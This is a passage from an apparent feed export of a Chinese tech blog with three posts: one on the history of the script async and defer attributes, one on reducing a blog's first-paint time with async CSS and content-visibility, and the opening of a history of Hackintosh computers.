触发之前执行</li>\n</ul>\n<p>鲜少有人知道的是，在 HTML5 之前，异步加载和执行外部脚本有一段混乱而荒唐的历史。</p>\n<p><code>defer</code> 属性的历史可以追溯到 1999 年 12 月 24 日制定的 HTML4.01 规范。在 <a href=\"https://www.w3.org/TR/html401/interact/scripts.html#adef-defer\">规范的第 18.2 节中的 18.2.1「SCRIPT 元素」</a> 中，有对 <code>defer</code> 属性的描述：</p>\n<blockquote>\n<p>When set, this boolean attribute provides a hint to the user agent that the script is not going to generate any document content (e.g., no “document.write” in javascript) and thus, the user agent can continue parsing and rendering.</p>\n<p>该 Boolean Attribute 用于提示 User Agent 这份脚本不会生成 document 内容（如，不使用 <code>document.write</code>），因此 User Agent 在遇到该脚本时不应该暂停解析和渲染 document。</p>\n</blockquote>\n<p>值得注意的是，在 HTML4.01 规范中没有强制浏览器用什么行为面对 <code>defer</code> 属性，各个浏览器的实现导致了千奇百怪的行为，这里仅简单列举几个 Quirk 行为：</p>\n<ul>\n<li>2001 年发布的 IE 6 开始对 <code>defer</code> 属性提供支持，但是直到 11 年后 IE 10 发布之前，IE 都不能保证带有 <code>defer</code> 属性的 <code>&lt;script&gt;</code> 能够按顺序执行：如果第一个 <code>defer</code> 的 <code>&lt;script&gt;</code> 使用 DOM API 修改了 DOM 结构、那么第二个 <code>&lt;script defer&gt;</code> 会在第一个 <code>&lt;script&gt;</code> 执行完毕之前就会开始执行。</li>\n<li>2009 年发布的 Firefox 3.5 开始对 <code>defer</code> 属性提供支持，<a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=688580\">但是带有 <code>defer</code> 的 <code>&lt;script&gt;</code> 可能会在 <code>DOMContentLoaded</code> 之后加载和执行</a>，而且 Firefox 甚至会异步执行带有 <code>defer</code> 属性的内联脚本。这一行为直到五年后在 Firefox 31 中才被修复。</li>\n<li>2010 年的 Chrome 8 开始实现 <code>defer</code> 属性。但如果页面的 MIME Type 为 XHTML（<code>application/xhtml+xml</code>），那么 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=874749\">Chrome 会无视 <code>&lt;script&gt;</code> 的 <code>defer</code> 属性</a>，因为 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=611136\">在 XHTML 中 <code>defer</code> 属性只是一个可选实现</a>。</li>\n</ul>\n<p>终于在 HTML5 中，不仅 <code>defer</code> 应有的行为被正式确定下来，而且还介绍了一个新的属性 <code>async</code>，提供了「真正异步地」加载和执行外部脚本的方式。也正是因为 HTML5 正式发布，下面这张介绍 <code>defer</code> 和 <code>async</code> 区别的图也开始深入人心：</p>\n<blockquote><p>这张出现在绝大部分文章中的图，正是来自 HTML5 规范：<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async\">https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async</a></p></blockquote>\n<p>IE 10、Chrome 8、Firefox 3.6 都对 <code>async</code> 属性提供了支持。相对于 <code>defer</code> 混乱的实现，浏览器对 <code>async</code> 的实现可谓是乖巧了许多：除 Safari 5.0 会无视 <code>async</code> 的取值外（<code>async=false</code> 时仍然会异步地加载和执行该外部脚本。这一 Bug 在 Safari 5.1 即被修复），绝大部分浏览器的实现都很正常。</p>\n<h2>等等，动态插入的 script 标签呢</h2>\n<p>如果你还记得 Google 给出的第一种 <code>analytics.js</code> 的加载方法的话（什么？你不记得了？快回到第一节再看一遍），你会注意到 Google 为了「保证了脚本在所有浏览器上都会异步地加载和执行」，使用了 <code>document.createElement('script')</code> 和 <code>el.parentNode.insertBefore</code> 动态插入 <code>&lt;script&gt;</code> 标签。这就引出了这一节的内容：动态插入的 <code>&lt;script&gt;</code> 应该按照什么顺序加载和执行呢？</p>\n<p>这个问题在 HTML4.01 的规范中完全没有说明，因此 HTML5 发布之前，当时的浏览器也依然采用了自己的实现：</p>\n<ul>\n<li>对于 WebKit、Blink 和 IE，动态插入的脚本将会被默认视为需要被异步加载和执行的脚本。如果要同步执行，需要显式声明 <code>async = false</code>。</li>\n<li>对于 Presto（早期 Opera 使用的自研内核）和 Firefox &lt;= 4，动态插入的脚本会默认同步加载和执行，除非显示声明 <code>async = true</code>。不过从 Firefox 4.0 开始，动态插入的脚本将会异步加载和执行，以和 IE、WebKit 行为保持一致（因此同步执行也一样需要显式声明 <code>async = false</code> ）；当 Opera 15 开始更换为基于 Chormium 开发（当时 Chromium 版本为 28）后，行为也变得和 IE、WebKit 一致。</li>\n</ul>\n<p>在 HTML5 规范中，这一问题终于被一劳永逸的解决了。在「<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#script-processing-model\">HTML Standard - 4.12.1.1 Processing Model</a>」中明确规定了浏览器应该如何处理动态插入的 <code>&lt;script&gt;</code>。对于传统的脚本（非 Module），大致处理流程如下所示：</p>\n<blockquote><p>本图由 Sukka 绘制，按照 CC BY-NC-SA 4.0 协议共享。使用时请遵守许可协议，注明出处、不得被用于商业用途（除非获得书面许可）。</p></blockquote>\n<h2>尾声</h2>\n<p>Google Analytics 在 2013 年开始逐渐用 <code>analytics.js</code> 代替 <code>ga.js</code> 时，市面上同时存在有现代的支持 HTML5 和 <code>async</code> 属性的浏览器、和不支持 <code>async</code> 属性的「前 HTML5 时代的」古董浏览器。如果要保证在所有的浏览器上 Google Analytics 都能被异步地加载和执行，动态地将 <code>&lt;script&gt;</code> 标签插入 DOM 中、并显式声明 <code>async = true</code> 无疑是唯一的方法。随着古董浏览器逐渐退出人们的视线、实现 <code>async</code> 属性的浏览器在全球的份额已经达到了 98.08%，Google 终于开始直接用 <code>&lt;script async&gt;</code> 标签引入 Google Tag Manager。</p>\n<div class=\"license\"> <div class=\"license-title\">从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/script-async-defer/\">https://blog.skk.moe/post/script-async-defer/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-13</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/script-async-defer/"},{"title":"再快一点，再快一点 —— 优化博客白屏时间的实践","date":"2020-10-03 08:40:00","description":"\n<p>两个多月以前，我写了一篇文章 <a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">介绍我是如何优化我的博客的</a>，但是我对于博客的白屏时间仍然不满意。过去一个月我在博客上进行了一系列优化实践，终于成功将博客的白屏时间减少了将近 50%，这篇文章就来记录优化的过程和方案。</p>\n<h2>确定和分析白屏时间</h2>\n<p>First Paint 和 First Contentful Paint 是衡量白屏时间的重要指标。Google Chrome 团队提供了专门的库 <code>web-vitals</code> 用于在浏览器中衡量这些指标。直接在本地开发环境中引入该库：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"module\"</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-keyword\">import</span> {getFCP, getLCP, getFID} <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'https://unpkg.com/web-vitals@0.2.4/dist/web-vitals.es5.min.js?module'</span>;</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Contentful Paint</span></span><span class=\"javascript\">  getFCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 Largest Contentful Paint</span></span><span class=\"javascript\">  getLCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Input Delay</span></span><span class=\"javascript\">  getFID(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>访问在本地运行的 Hexo Server 实例（<code>http://localhost:4000</code>），打开任意一篇文章，然后在 Dev Tools 中切换到「Performance」Tab 中限制 Network 和 CPU 性能：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/1.png\" width=\"1276\" height=\"279\" class=\"lazy post-img\"></p>\n<blockquote><p>进行性能测试时，模拟移动端的网络和性能是非常重要的。然而，Firefox 的 Dev Tools 至今很遗憾地没有实现这个功能（许多类似的 Feature Request 在 Bugzilla 已经 stall 数个月了）。这也是为什么我钟情于使用 Chromium Based 的浏览器开发的原因。</p></blockquote>\n<p>刷新页面，Console 中会输出三个数值（单位均为毫秒）：</p>\n<pre><code class=\"hljs plaintext\">FCP 1537.4400000000605LCP 1921.934FID 3.559999997378327</code></pre>\n<p>可以看到，First Contentful Paint 时间在 1.5 秒左右、而 Largest Contentful Paint（最大的可视元素，此时是文章的头图）是 1.9 秒。考虑到这是在本地环境、TTFB 只受模拟的「Fast 3G」限制，不难想象在实际访客体验中白屏时间绝对不止 1.5 秒。</p>\n<h2>分析性能瓶颈</h2>\n<p>肯定了问题的确存在，接下来就需要寻找性能瓶颈了。在「Performance」Tab 中将 CPU 性能修改为「6x slowdown」放大性能瓶颈，然后用「Start profiling and reload page」按钮刷新页面和获取火焰图：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/2.png\" width=\"1386\" height=\"946\" class=\"lazy post-img\"></p>\n<p>其中，Layout 占据的时间（117.43ms）比 Parse HTML（22.48ms）和 Recalculate Style（20.37ms）都要长得多，基本可以认定这就是性能瓶颈了。接下来判断是页面什么元素导致了 Layout 的性能瓶颈。对博客中其它页面进行 Profiling，并将火焰图进行对比：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/3.png\" width=\"860\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>从左往右分别是 「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」、首页、「<a href=\"https://blog.skk.moe/post/hello-world/\">Hello World</a>」页面的火焰图和 Layout 用时。</p></blockquote>\n<p>根据火焰图和三个页面的特征，猜测是文章内容部分导致了 Layout 用时过长。为了加以验证，在 CSS 中使用 <code>display: none</code> 将文章内容直接从 DOM 中离线，然后重新生成火焰图。</p>\n<blockquote><p>在页面渲染时， <code>display: none</code>  的元素会直接从 DOM 中离线、不参加 Style 和 Layout。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/4.png\" width=\"1194\" height=\"946\" class=\"lazy post-img\"></p>\n<p>将文章内容设置 <code>display: none</code> 后，Layout 性能直接提升了三倍，所以可以确认性能瓶颈就是文章内容的 Layout 了。</p>\n<h2>优化白屏时间</h2>\n<p>文章内容的 Layout 时间比较长，而文章内容在加载完之前不会触发 First Paint。所以如果需要缩短白屏时间，就必须缩短文章内容 Layout 的用时。</p>\n<p>Layout 是浏览器计算元素几何信息的过程：元素的大小、在页面中的位置。Layout 性能一般和 DOM 元素数量、布局复杂性、布局模型有关。对于 DOM 元素数量这一点没有什么好的解决方案 —— 文章就这么长、每个段落就是一个 <code>&lt;p&gt;</code> 元素；对于文章内容也没有布局复杂性或布局模型可言。因此这是一条死路。</p>\n<p>直接对着自己的博客动死脑筋是行不通的，我决定先和其他的内容网站的 Layout 性能对比一下：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/5.png\" width=\"960\" height=\"500\" class=\"lazy post-img\"></p>\n<blockquote><p>上图左一为知乎专栏文章「<a href=\"https://zhuanlan.zhihu.com/p/25800461\">PWA 在饿了么的实践经验</a>」的火焰图；左二为 QuQuBlog「<a href=\"https://imququ.com/post/optimize-tls-handshake.html\">TLS 握手优化详解</a>」的火焰图；左三为 dev.to 的「<a href=\"https://dev.to/mustapha/css-grid-illustrated-introduction-52l5\">CSS Grid: illustrated introduction</a>」的火焰图。</p></blockquote>\n<p>和其它内容网站比较发现，当页面包含较长篇幅的内容时，「CPU 6x slowdown」下 Layout 用时大抵在 100ms 到 200ms 左右。我的博客内容页面 Layout 用时在 120ms 属于正常范围、基本没有进一步优化的空间。</p>\n<p>不过，我在看 dev.to 的火焰图时发现了一个很有趣的现象：虽然完整 DOM 的 Layout 用时在 123.70ms、但是却发生在 First Paint 和 First Contentful Paint 之后。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/6.png\" width=\"1090\" height=\"314\" class=\"lazy post-img\"></p>\n<p>结合截图和火焰图可以发现，dev.to 在加载文章页面时，先只渲染 Navbar、触发 First Paint、结束白屏；之后继续 Parse HTML、渲染页面主体内容；最后是 Lazyload 后的文章头图、触发 Largest Contentful Paint。这种思路在 H5、小程序中都是很常见：使用 Placeholder （被称为 AppShell）缩短白屏时间、然后再通过 AJAX 获取数据填充到页面上。但是静态博客和小程序最大的区别就是不需要获取数据、文章内容是直接包含在 HTML 中返回的，所以在博客上实践这样的思路需要做一些改变。</p>\n<p>我的做法则是将 CSS 拆分，将 Navbar 和右下角 Fab 按钮的 CSS 提取出来、内联在 HTML 中、当页面加载时就可以 Style &amp; Layout。同时为页面主题内容添加 <code>display: none</code> 使其在 DOM 中离线，使其不影响 First Paint；页面主体内容的 CSS（包括  <code>display: block</code>） 拆分成独立的 CSS。由于 CSS 是「渲染阻塞（Render Blocking）」的资源，浏览器在 Parse HTML 时如果遇到 CSS 就会开始请求、并在 CSS 下载完成之前不会开始 Style &amp; Layout。因此，需要一个小 trick 实现异步加载 CSS（使 CSS 不再阻塞渲染）：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span> <span class=\"hljs-attr\">media</span>=<span class=\"hljs-string\">\"print\"</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">\"this.media='all';this.onload=null\"</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">noscript</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">noscript</span>&gt;</span></code></pre>\n<p>带有 <code>[media=print]</code> 属性的 CSS 仍然会以低优先级加载，但并不会直接参与 Style &amp; Layout、因此不会阻塞渲染。当 CSS 文件下载后触发 <code>onload</code> 事件、将 <code>media</code> 属性改为 <code>all</code>、使 CSS 在当前页面生效。</p>\n<p>为了使白屏不显得枯燥，我还加了一个「加载中」的闪烁动画，使用 <code>animation-delay</code> 延迟 0.6 秒显示。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/9.png\" width=\"813\" height=\"849\" class=\"lazy post-img\"></p>\n<p>不过使用这种方案需要注意两个问题。一是当页面内容被 <code>display: none</code> 后、页面的高度会小于 viewport、因此浏览器不会展示滚动条；当页面内容被覆盖为 <code>display: block</code> 后、浏览器会重新展示滚动条、导致抖动，因此需要为 <code>&lt;html&gt;</code> 添加 <code>overflow-y: scroll</code>。另一个问题是新的 CSS 生效时会触发新的 Style &amp; Layout、可能会导致已经渲染过的 Navbar 和 Fab 按钮被再次 Layout，造成性能浪费；解决方案是使用「<a href=\"https://drafts.csswg.org/css-contain/\">CSS Containment</a>」草案中引入的 <code>contain</code> 属性，通过在 CSS 中显式声明当前元素及其后代与 DOM 的关系，当浏览器重新计算样式和布局时只会影响有限的 DOM。截至本文写就，Edge（Chromium Based）、Firefox、Chrome 都已经对 <code>contain</code> 属性提供了支持。关于 CSS Containment 的用法，可以参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/contain\">MDN 上对 contain 的说明</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/7.png\" width=\"800\" height=\"368\" class=\"lazy post-img\"></p>\n<p>同时，如果使用异步加载 CSS，那么页面主体内容的显示时机就会受到两个因素制约 —— 除 Style &amp; Layout 外、还有 CSS 的加载。为了尽可能消除 CSS 加载对文章内容显示的影响，我为 CSS 设置了 HTTP/2 Push，这样 CSS 能够和 HTML 同时到达浏览器、但不会马上参与 First Paint 的 Style &amp; Layout。关于 HTTP/2 Push 的更多细节，可以参考我的文章「<a href=\"https://blog.skk.moe/post/http2-server-push/\">静态资源递送优化：HTTP/2 和 Server Push</a>」。</p>\n<p>实践的效果妙不可言：First Paint 之前的 Style &amp; Layout 用时加起来也不超过 50ms、几乎 HTML 一下载完就可以看到 Navbar。当 <code>defer.css</code> 加载完、样式和布局计算完后文章内容即绘制到屏幕上。如果 <code>defer.css</code> 出于某种原因没有及时加载（如 User-Agent 不支持 HTTP/2 Push、<code>defer.css</code> 未能命中缓存），那么「加载中…」就会展示出来，使访客不会认为页面失去响应。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/8.png\" width=\"1106\" height=\"945\" class=\"lazy post-img\"></p>\n<h2>尝试新属性</h2>\n<p>虽然减少了白屏时间，但是长篇幅的内容的布局计算仍然非常耗时；当文章越来越长时，用户仍然可能会对「加载中」失去耐心。不过 Chromium 85 开始对一些 CSS Containment 草案中的 CSS 属性（如 <code>content-visibility</code>）提供支持。当一个元素被声明  <code>content-visibility</code> 属性后，如果这个元素不在 viewport 中、浏览器就不会计算其后代元素样式和属性，从而大幅节省 Style &amp; Layout 耗时。目前，仅 Chrome/Chromium 85 提供对该属性的支持（没错，Firefox 把这个 Feature 也扔进「值得一试」里了）。更多关于 <code>content-visibility</code> 的介绍可以查看 <a href=\"https://web.dev/content-visibility/\">web.dev 上的相关文章</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/10.jpg\" width=\"1600\" height=\"1108\" class=\"lazy post-img\"></p>\n<p>使用 <code>content-visibility</code> 属性需要将页面内容分块。于是我写了一个 Hexo 插件，在文章内容渲染时将每两个 <code>&lt;h2&gt;</code> 之间的内容分为一块、用 <code>&lt;div class=\"story\"&gt;</code> 包裹起来。然后为 <code>.story</code> 声明 <code>content-visibility: auto</code>。</p>\n<p>需要注意的是，<code>content-visibility</code> 绕过的是不在当前 viewport 的元素的后代元素的样式和布局、只保留一个元素盒子。如果没有显式声明元素的高度的话那么这个元素的高度就是 0 了。虽然 Chrome/Chromium 在实现 <code>content-visibility</code> 时会试图避免 Curative Layout Shift（在元素即将进入 viewport 时就开始渲染），但是滚动条的高度会发生改变。所以「CSS Containment」草案中还提出了一个新属性 <code>contain-intrinsic-size</code>、用于声明一个「元素盒子」的高度。这个属性不影响渲染后元素的实际尺寸，实际使用时只需要预估高度即可：</p>\n<pre><code class=\"hljs css\"><span class=\"hljs-selector-class\">.story</span> {  <span class=\"hljs-attribute\">content</span>-<span class=\"hljs-attribute\">visibility</span>: auto;  contain-intrinsic-size: <span class=\"hljs-number\">1000px</span>; // 不靠谱地取个 <span class=\"hljs-number\">1000px</span>}</code></pre>\n<blockquote><p><code>content-visibility</code> 除了可以改善 Layout 性能外，值得一提的还有其另一个取值 <code>hidden</code>。众所周知 <code>display: none</code> 会使元素「离线」，元素会从 DOM 中消失、同时渲染状态也会随之消失；而 <code>visibility: hidden</code> 只是会隐藏元素、而元素本身依然保留在 DOM 中，渲染状态也保留。而 <code>content-visibility: hidden</code> 则介于两者之间，元素会从 DOM 中消失、但是保留渲染属性。</p></blockquote>\n<p>利用 <code>content-visibility</code> 和 <code>contain-intrinsic-size</code> 后，文章的 Layout 时间从 120ms 减少到了 70ms、减少了将近 40%，只能希望越来越多的浏览器能够提供对这两个属性的支持了。</p>\n<div class=\"license\"> <div class=\"license-title\">再快一点，再快一点 —— 优化博客白屏时间的实践</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/improve-fcp-for-my-blog/\">https://blog.skk.moe/post/improve-fcp-for-my-blog/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-03</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/improve-fcp-for-my-blog/"},{"title":"黑苹果的历史","date":"2020-09-02 21:45:00","description":"\n<h2>楔子：第一台「黑苹果」</h2>\n<p>如果按照「黑苹果」的定义 —— 在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统 —— 那么全世界第一台「黑苹果」应该诞生于 24 年前。1996 年，苹果将 Macintosh 电脑切换到 IBM 的 PowerPC 架构。时任苹果 CEO Gil Amelio 借此机会，与一些使用和 Macintosh 同款 CPU 和主板的厂商（如摩托罗拉）签约，授权他们的 PC 预装苹果的 Macintosh System 7（即 Classic Mac OS 7）。</p>\n<p>然而，1997 年 7 月发生了两件事。一件事是乔布斯回到苹果、被正式任命为苹果公司的 CEO，另一件事是 7 月 26 日 Mac OS 8 正式发布。</p>\n<p>Mac OS 8 并没有带来革命性的更新 —— 这个版本原本应该被命名为 Mac OS 7.7 。但是苹果公司前 CEO 同第三方厂商签订的系统授权协议是基于 Macintosh System 7 的。乔布斯选择发布 Mac OS 8.0，巧妙地利用命名和版本号的不同，直接把后续的服务和协议一起中断掉了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/1.png\" width=\"405\" height=\"599\" class=\"lazy post-img\"></p>\n<blockquote><p>摩托罗拉生产的 StarMax 兼容机，可以直接安装 System 7。</p></blockquote>\n<h2>从 PowerPC 到 x86</h2>\n<p>把 Macintosh System 7 的授权协议理解为黑苹果有些取巧了。要谈现代的黑苹果，那么一定不能无视苹果迈向 x86 的道路，所以让我们把时间再倒回去 5 年吧。</p>\n<p>1992 年 2 月 14 日，苹果开展了一项秘密计划「Star Trek」，将 Macintosh System 7（Classic Mac OS 7）连同其应用程序迁移到 Intel 架构兼容的 PC 机（采用 Intel 486 处理器）上，并要求在 12 月 1 日就拿出第一台原型机。苹果的工程师夜以继日的重构，终于赶在 Deadline 之前完成了 System 7 和 QuickTime 的移植。但是随着苹果时任 CEO John Sculley 离开公司，接任的 CEO Michael Spindler 更青睐 PowerPC 架构，Star Trek 随即被取消。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/2.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Macintosh System 7 的界面截图</p></blockquote>\n<p>虽然 Star Trek 被取消，但是仍然有部分苹果工程师努力将 Mac OS 移植到 x86 平台，其中成果最显著的是工程师 John Kullman，他在 2001 年 12 月成功将 Mac OS X 移植到了 x86 的 Quora PC 上。被称为「Mac OS X 之父」的 Bertrand Serlet（他后来成为 10.4 Tiger、10.5 Leopard 和 10.6 Snow Leopard 主要负责人）得知此事后与 John Kullman 会面，希望他将 Mac OS X 移植到一台索尼 VAIO 笔记本上。John Kullman 在当天晚餐之前就完成了任务。第二天，乔布斯就带着这台 VAIO 飞往东京，与索尼时任社长安藤国威会面，商讨有关在索尼的 VAIO 上运行 Mac OS X 的事宜，但谈判无疾而终。</p>\n<p>即使「索粉」乔布斯未能和索尼达成合作，苹果内部仍然于 2002 年进行了一项新的秘密计划「Marklar」，目的是继续维持 Mac OS X 与 x86 的兼容性。直到 2005 年 6 月 6 日，苹果在旧金山莫斯康展览中心举办了 WWDC 2005，乔布斯正式宣布他们将把个人电脑产品线 <a href=\"https://www.apple.com/newsroom/2005/06/06Apple-to-Use-Intel-Microprocessors-Beginning-in-2006/\">从 PowerPC 架构转变为 Intel 架构</a>。2006 年 1 月 10 日，苹果发布了第一台使用 Intel Core（英特尔酷睿）的 MacBook Pro，代替先前的产品线 PowerBook。12 月 28 日，苹果发布了 Mac Mini，同样搭载了 Intel Core 处理器。2007 年 4 月 5 日，苹果推出 Boot Camp（启动转换），4 月 24 日，苹果推出 17 寸的 MacBook Pro，5 月 16 日，苹果推出 12 寸的 MacBook 以代替 iBook 产品线，7 月 5 日，苹果推出 iMac 以代替 eMac 产品线，8 月 7 日，苹果推出新的高端电脑产品线 Mac Pro。2009 年 8 月，苹果推出 Mac OS X 10.6 Snow Leopard，这是第一个只支持 x86 的 Mac OS X，宣告苹果正式放弃了对 PowerPC 的支持。</p>\n<h2>黑苹果的第一道曙光</h2>\n<p>回到 WWDC 2005，苹果向开发者推出了搭载 Intel 处理器的 DTK（Dev Transition Kit），搭载了兼容 Intel 的 Mac OS X 10.4.1。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/3.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Mac OS X 10.4.1 Tiger 开发版运行在搭载了 Intel 处理器的 DTK 上。</p></blockquote>\n<p>很快，就有人尝试在非苹果硬件上运行开发版的 Mac OS X，但是该系统拒绝在普通的 PC 上运行：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/4.png\" width=\"724\" height=\"400\" class=\"lazy post-img\"></p>\n<blockquote><p>当试图在非 Mac 平台上安装开发版的 Mac OS X Tiger 10.4.1 时会看到上图的提示信息：Darwin/x86 不支持你的硬件配置。</p></blockquote>\n<p>当时，将 Mac OS X Tiger 10.4.1 运行在普通的 PC 上有三大障碍：第一是指令集，DTK 内置的 <a href=\"https://ark.intel.com/content/www/cn/zh/ark/products/27484/intel-pentium-4-processor-660-supporting-ht-technology-2m-cache-3-60-ghz-800-mhz-fsb.html\">Intel Pentium 4 660 CPU</a> 支持 SSE-3 指令集，但是 2004 年前后的 PC 常见的处理器都不包括该指令集；其次是芯片组，Mac OS X 开发版只支持 Intel 915G/ICH6 芯片组；最后，当时的苹果的 DTK 使用了 Infineon TPM 安全芯片。讽刺的是，最难克服的障碍其实不是硬件或安全芯片，而是指令集。</p>\n<p>目前可考的第一台成功的黑苹果诞生于 2005 年 8 月 10 日，那一天 <a href=\"https://web.archive.org/web/20051018182314/http://hardmac.com/news/2005-08-10/\">HardMac 网站收到匿名开发者发来的两段视频</a>，视频中展示了 Mac OS X 10.4.1 Tiger 运行在搭载 Pentium M 735 处理器的 Mitac 8050D 笔记本上。</p>\n<blockquote><p>值得一提的是，2006 年 1 月 10 日苹果发布 MacBook Pro，相比传统 x86 主板使用 BIOS 引导（Legacy），MacBook Pro 使用了 UEFI 引导方式。</p></blockquote>\n<p>2006 年 2 月 14 日，「The Guru」团队的成员 Maxxuss（crg92）发布了首个 Patch 补丁。通过该补丁修补 XNU 内核即可解除引导和安装限制、在任何内置 SSE-2 指令集的 Intel 处理器上运行 Mac OS X 10.4.4，今天 <a href=\"https://www.insanelymac.com/forum/topic/9071-1044-security-broken/?page=1\">在 InsanelyMac 上仍然可以找到当时的帖子</a>。几小时之后苹果发布了 10.4.5 版本的 Mac OS X，又过了两周 crg92 就放出了新的针对 10.4.5 的补丁。</p>\n<p>苹果随后的几个月内发布了 Mac OS X 10.4.6 和 10.4.7，OSx86 社区成员设法将这些系统中的新版本的内核替换为 10.4.4 和 10.4.5 的旧内核、实现将这些新版本的系统安装在 PC 上。但是从 10.4.8 开始，苹果开始更广泛地使用 SSE-3 指令集，意味仅仅通过修补 XNU 内核已经无法再兼容只支持 SSE-2 指令集的处理器（如早期的奔腾 4）。来自新西兰的 macOS、iOS 开发者与逆向工程师 <a href=\"http://mifki.com/\">Mfiki</a>（Vitaly Pronkin）于 2006 年 12 月 24 日放出了一个新的更精简的 Patch 以使 XNU 内核兼容 SSE2；而开发者 Semthex 则制作了一个通过 SSE-2 模拟 SSE-3 的指令集模拟器。 </p>\n<p>Mac OS X 10.5 Leopard 于 2007 年正式发布，随后 BrazilMac 发布了一个通用补丁。用户可以通过购买 Mac OS X 零售版的安装光盘、打上补丁即可让 XNU 内核运行在普通 Intel PC 上。之后，数个黑客和开发者（如 Lorem、SynthetiX、ToH、StageXNU 团队）都纷纷释出了内核补丁。同时，基于这些补丁制作的 Mac OS X「发行版」开始出现，如 iATKOS、<a href=\"https://www.insanelymac.com/forum/topic/77069-kalyway-1051-dvd-release-the-official/\">KALYWAY</a> 和 <a href=\"http://ipcosx86.wikidot.com/\">iPC</a>。</p>\n<blockquote><p>之后随着 EFI 引导方法的流行，这些发行版都逐渐改为在系统中内置 Boot-132 或 Chameleon。</p></blockquote>\n<h2>中场休息：对美国法院的一瞥</h2>\n<p>2008 年 4 月，一家名为 Psystar 的公司在美国佛罗里达州注册。这家公司计划公开销售 Intel PC，预装内置 BrazilMac 补丁的 Mac OS X 10.5 Leopard。这种 PC 一开始被称为「OpenMac」，很快又被更名为「Open 